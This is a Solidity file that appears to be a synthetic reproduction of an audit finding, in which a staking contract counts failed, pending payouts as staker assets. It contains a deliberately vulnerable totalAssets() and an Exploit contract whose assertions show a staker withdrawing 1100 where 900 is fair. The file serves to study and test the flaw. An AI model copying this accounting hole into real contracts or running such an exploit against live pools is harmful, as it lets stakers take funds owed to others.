// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Coinflip staking — total assets ignore pending payouts
    (Pashov C-01, February 2025).
    SYNTHETIC, cheatcode-free. A payout transfer returns false and
    pendingPayouts is increased, but totalAssets is still the raw
    token balance. The staker withdraws 1100. Fair, after the 200
    pending payout, is 900. */

contract Asset {
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public blocked;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function blockRecipient(address who) external {
        blocked[who] = true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (blocked[to]) return false;
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Staking {
    Asset public token;
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    mapping(address => mapping(address => uint256)) public pendingPayouts;
    uint256 public pendingTotal;
    uint256 public cachedAssets;

    constructor(Asset token_, address staker) {
        token = token_;
        shares[staker] = 1000;
        totalShares = 1000;
    }

    function transferPayout(address tokenAddr, address recipient, uint256 amount) external returns (bool) {
        bool callSucceeded = token.transfer(recipient, amount);
        if (!callSucceeded) {
            pendingPayouts[tokenAddr][recipient] += amount;
            pendingTotal += amount;
            return false;
        }
        return true;
    }

    function totalAssets() public virtual returns (uint256) {
        // @> VULN: pending payouts sit in the token balance and are still counted as staker equity.
        cachedAssets = token.balanceOf(address(this));
        return cachedAssets;
    }

    function withdraw(address user) external returns (uint256 out) {
        uint256 userShares = shares[user];
        uint256 assets = this.totalAssets();
        out = assets * userShares / totalShares;
        shares[user] = 0;
        totalShares -= userShares;
        token.transfer(user, out);
    }
}

contract Exploit {
    Asset public token; // nonce 1
    Staking public staking; // nonce 2
    address public winner;

    constructor() {
        token = new Asset();
        winner = address(0xBEEF);
        token.blockRecipient(winner);
        staking = new Staking(token, address(this));
        token.mint(address(staking), 1100);
    }

    function run() external {
        bool paid = staking.transferPayout(address(token), winner, 200);
        uint256 out = staking.withdraw(address(this));
        uint256 fair = out - staking.pendingTotal();
        require(paid == false, "payout should fail");
        require(out == 1100, "withdrew 1100");
        require(fair == 900, "fair is 900");
        require(out - fair == 200, "off by 200");
        require(token.balanceOf(address(this)) == 1100, "staker balance");
        require(token.balanceOf(address(staking)) == 0, "pool emptied");
    }
}
